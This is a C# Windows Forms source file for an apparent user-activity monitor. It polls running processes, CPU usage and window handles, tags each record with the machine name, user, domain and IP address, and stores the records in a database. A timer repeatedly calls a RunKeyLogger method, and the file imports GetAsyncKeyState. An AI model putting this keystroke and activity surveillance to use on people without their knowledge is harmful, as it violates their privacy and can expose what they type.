using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.Linq;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;


namespace CrcMrc
{
        

    public partial class Form2api : Form
    {
        const ProcessData PROCESS_DATA_NOT_FOUND = null;
        const ListViewItem PROCESS_ITEM_NOT_FOUND = null;

        [DllImport("user32.dll")]
        static extern IntPtr GetActiveWindow();

        [DllImport("user32")]
        private static extern UInt32 GetWindowThreadProcessId(Int32 hWnd , out Int32 lpdwProcessId);

        [DllImport("user32.dll")]
        public static extern IntPtr FindWindowEx(IntPtr parentWindow, IntPtr previousChildWindow, string windowClass, string windowTitle);

        private Int32 GetWindowProcessID_(Int32 hwnd)
        {
            Int32 pid = 1;
            GetWindowThreadProcessId(hwnd, out pid);
            return pid;
        }

        [DllImport("user32.dll")]
        static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);


        ArrayList ProcessDataList = new ArrayList();
        ArrayList IDList = new ArrayList();
        ListViewItem IdleProcessItem;
        dsProcess.ProcessDataTable pdt;
        common comm;
        DBConnect dbConnect;


        public Form2api()
        {
            InitializeComponent();
            comm = new common();
            dbConnect = new DBConnect();
            InitVal();
        }        

        private void InitVal()
        {
            pdt = new dsProcess.ProcessDataTable();            

        }

        private void SaveXml()
        {
            pdt.WriteXml("temp.xml");
        }

        private void GetUsage()
        {
            
            ProcessEntry32 ProcessInfo = new ProcessEntry32();            
            ProcessTimes ProcessTimes = new ProcessTimes();
            IntPtr ProcessList, ProcessHandle = ProcessCPU.PROCESS_HANDLE_ERROR;
            ProcessData CurrentProcessData;
            int Index;
            int Total = 0;
            bool NoError;

            // this creates a pointer to the current process list
            ProcessList = ProcessCPU.CreateToolhelp32Snapshot(ProcessCPU.TH32CS_SNAPPROCESS, 0);

            if (ProcessList == ProcessCPU.PROCESS_LIST_ERROR) { return; }

            // we usage Process32First, Process32Next to loop threw the processes
            ProcessInfo.Size = ProcessCPU.PROCESS_ENTRY_32_SIZE;
            NoError = ProcessCPU.Process32First(ProcessList, ref ProcessInfo);
            IDList.Clear();

            ProcessView.SuspendLayout();

            while (NoError)
                try
                {
                    // we need a process handle to pass it to GetProcessTimes function
                    // the OpenProcess function will provide us the handle by the id
                    ProcessHandle = ProcessCPU.OpenProcess(ProcessCPU.PROCESS_ALL_ACCESS, false, ProcessInfo.ID);                    

                    // here's what we are looking for, this gets the kernel and user time
                    ProcessCPU.GetProcessTimes(
                        ProcessHandle,
                        out ProcessTimes.RawCreationTime,
                        out ProcessTimes.RawExitTime,
                        out ProcessTimes.RawKernelTime,
                        out ProcessTimes.RawUserTime);

                    // convert the values to DateTime values
                    ProcessTimes.ConvertTime();

                    //from here is just managing the gui for the process list
                    CurrentProcessData = ProcessExists(ProcessInfo.ID);
                    IDList.Add(ProcessInfo.ID);

                    if (CurrentProcessData == PROCESS_DATA_NOT_FOUND)
                    {
                        Index = ProcessDataList.Add(new ProcessData(
                            ProcessInfo.ID,
                            ProcessInfo.ExeFilename,
                            ProcessTimes.UserTime.Ticks,
                            ProcessTimes.KernelTime.Ticks));

                        AddProcess((ProcessData) ProcessDataList[Index]);
                    }
                    else
                        Total += CurrentProcessData.UpdateCpuUsage(
                                    ProcessTimes.UserTime.Ticks,
                                    ProcessTimes.KernelTime.Ticks);
                }
                finally
                {
                    if (ProcessHandle != ProcessCPU.PROCESS_HANDLE_ERROR)
                        ProcessCPU.CloseHandle(ProcessHandle);

                    NoError = ProcessCPU.Process32Next(ProcessList, ref ProcessInfo);
                }

            ProcessCPU.CloseHandle(ProcessList);

            Index = 0;

            DateTime dt = (System.DateTime)DateTime.Now;

            while (Index < ProcessDataList.Count)
            {
                ProcessData TempProcess = (ProcessData)ProcessDataList[Index];
                dsProcess.ProcessRow row;
                row = pdt.NewProcessRow();
                row.CompName = GetCompname();
                row.CompUser = GetCompUser();
                row.IP = GetIPAddress();
                row.ProcesName = TempProcess.Name;
                row.CPUUse = TempProcess.CpuUsage;
                row.ProcTime = dt;
                row.ProcID = (Int32) TempProcess.ID;

                //Int32 hwnd = 0;                
                //hwnd = GetForegroundWindow().ToInt32();
                string sProzori = String.Empty;
                IntPtr[] prozori = GetProcessWindows((int)TempProcess.ID);
                Int32[] lprozori = new Int32[prozori.Length];
                for (int j = 0; j < prozori.Length; j++)
                {                    
                    sProzori += "@" + prozori[j].ToInt32().ToString() + "@";
                    lprozori[j] = prozori[j].ToInt32();
                }

                Int32[] commonElements = comm.iHwnd.Intersect(lprozori).ToArray();
                if (commonElements.Length > 0)
                {
                    row.counter = (short) commonElements.Length;
                }

                row.hWindID = sProzori;
                //row.currWindID = hwnd.ToString();

                if (row.counter > 0)
                {
                    pdt.AddProcessRow(row);
                    pdt.AcceptChanges();
                }
                else
                {
                    //pdt.RemoveProcessRow(row);
                    row = null;
                    pdt.RejectChanges();
                }
                

                if (IDList.Contains(TempProcess.ID))
                    Index++;
                else
                {
                    ProcessView.Items.Remove(TempProcess.ProcessItem);
                    ProcessDataList.RemoveAt(Index);
                }
            }

            IdleProcessItem.SubItems[2].Text = (100 - Total) + "%";

            ProcessView.ResumeLayout();

            comm.ResetCounter();
        }
        

        private ProcessData ProcessExists(uint ID)
        {
            foreach (ProcessData TempProcess in ProcessDataList)
                if (TempProcess.ID == ID) return TempProcess;

            return PROCESS_DATA_NOT_FOUND;
        }

        private bool ProcessUpdated(uint ID)
        {
            foreach (uint UpdatedProcess in IDList)
                if (UpdatedProcess == ID) return true;

            return false;
        }

        private void UsageTimer_Tick(object sender, EventArgs e)
        {
            KeyTime.Stop();
            GetUsage();
            KeyTime.Start();
        }

        private void RunKeyLogger()
        {
            comm.LogKeys();
        }


        private void AddProcess(ProcessData NewProcess)
        {
            ListViewItem NewProcessItem = ProcessView.Items.Add(NewProcess.Name);

            NewProcessItem.SubItems.Add(NewProcess.ID.ToString());
            NewProcessItem.SubItems.Add("0%");

            NewProcess.ProcessItem = NewProcessItem;

            if (NewProcess.ID == 0)
                IdleProcessItem = NewProcessItem;
        }

        private IntPtr[] GetProcessWindows(int process)
        {
            IntPtr[] apRet = (new IntPtr[256]);
            int iCount = 0;
            IntPtr pLast = IntPtr.Zero;
            do
            {
                pLast = FindWindowEx(IntPtr.Zero, pLast, null, null);
                int iProcess_;
                GetWindowThreadProcessId((int)pLast, out iProcess_);
                if (iProcess_ == process) apRet[iCount++] = pLast;
            } while (pLast != IntPtr.Zero);
            System.Array.Resize(ref apRet, iCount);
            return apRet;
        }

        private string GetCompname()
        {
            return Environment.MachineName + "|" + Dns.GetHostName();
        }

        private string GetCompUser()
        {
            return Environment.UserName + "|" + Environment.UserDomainName;
        }
                
        public string GetIPAddress()
        {
            IPHostEntry Host = default(IPHostEntry);
            string Hostname = null;
            string sIPAddress = null;
            Hostname = System.Environment.MachineName;
            Host = Dns.GetHostEntry(Hostname);
            foreach (IPAddress IP in Host.AddressList)
            {
                if (IP.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork)
                {
                    //IPAddress = Convert.ToString(IP);
                    sIPAddress = Convert.ToString(IP);
                }
            }
            return sIPAddress;
        }

        private void btnWriteXml_Click(object sender, EventArgs e)
        {
            SaveXml();
        }

        private void KeyTime_Tick(object sender, EventArgs e)
        {
            RunKeyLogger();
        }

        private void TimerDB_Tick(object sender, EventArgs e)
        {

            //dbConnect.InsertProcess("CRC_Test", 505, DateTime.Now, "kreso", "kresimir", "192.168.1.101");
            
            for (int i = 0; i < pdt.Rows.Count; i++)
            {
                dsProcess.ProcessRow row;
                row = (dsProcess.ProcessRow) pdt.Rows[i];
                if (dbConnect.CheckProcess(row.ProcesName,row.ProcID,row.ProcTime,row.CompName,row.CompUser,row.IP) == false)
                {
                    dbConnect.InsertProcess(row.ProcesName, row.ProcID, row.ProcTime, row.CompName, row.CompUser, row.IP);
                    pdt.Rows[i].Delete();
                    pdt.AcceptChanges();
                }

            }
            
        }
    }
}